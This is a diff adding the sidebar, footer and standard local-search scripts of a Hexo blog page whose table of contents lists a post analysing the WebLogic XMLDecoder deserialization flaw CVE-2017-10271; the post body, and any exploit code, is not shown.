+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xun9er.com/" target="_blank" title="xun9er">
+                      
+                        <i class="fa fa-fw fa-globe"></i>xun9er</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://hack-for.fun/" target="_blank" title="M0nk3y">
+                      
+                        <i class="fa fa-fw fa-globe"></i>M0nk3y</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://106.15.121.121/" target="_blank" title="ttpfx">
+                      
+                        <i class="fa fa-fw fa-globe"></i>ttpfx</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/lyxf/" target="_blank" title="l0gan">
+                      
+                        <i class="fa fa-fw fa-globe"></i>l0gan</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.mythe.top/" target="_blank" title="mythe">
+                      
+                        <i class="fa fa-fw fa-globe"></i>mythe</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://cyzcc.vip/" target="_blank" title="cyzCc">
+                      
+                        <i class="fa fa-fw fa-globe"></i>cyzCc</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.d0g3.cn/" target="_blank" title="道格安全研究实验室">
+                      
+                        <i class="fa fa-fw fa-globe"></i>道格安全研究实验室</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebLogic-XMLDecoder反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">WebLogic XMLDecoder反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic简介"><span class="nav-number">1.0.1.</span> <span class="nav-text">weblogic简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#版本"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2017-10271"><span class="nav-number">1.0.2.</span> <span class="nav-text">CVE-2017-10271</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原因"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDEA远程调试"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">IDEA远程调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态调试"><span class="nav-number">1.0.3.</span> <span class="nav-text">动态调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">weblogic.wsee.jaxws.workcontext.WorkContextServerTube</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-wsee-jaxws-workcontext-WorkContextTube"><span class="nav-number">1.0.4.</span> <span class="nav-text">weblogic.wsee.jaxws.workcontext.WorkContextTube</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><span class="nav-number">1.0.5.</span> <span class="nav-text">weblogic.wsee.jaxws.workcontext.WorkContextServerTube</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-workarea-WorkContextMapImpl"><span class="nav-number">1.0.6.</span> <span class="nav-text">weblogic.workarea.WorkContextMapImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-workarea-WorkContextLocalMap"><span class="nav-number">1.0.7.</span> <span class="nav-text">weblogic.workarea.WorkContextLocalMap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-workarea-spi-WorkContextEntryImpl"><span class="nav-number">1.0.8.</span> <span class="nav-text">weblogic.workarea.spi.WorkContextEntryImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter"><span class="nav-number">1.0.9.</span> <span class="nav-text">weblogic.wsee.workarea.WorkContextXmlInputAdapter</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#调用栈总结"><span class="nav-number">1.0.9.1.</span> <span class="nav-text">调用栈总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">1.0.10.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
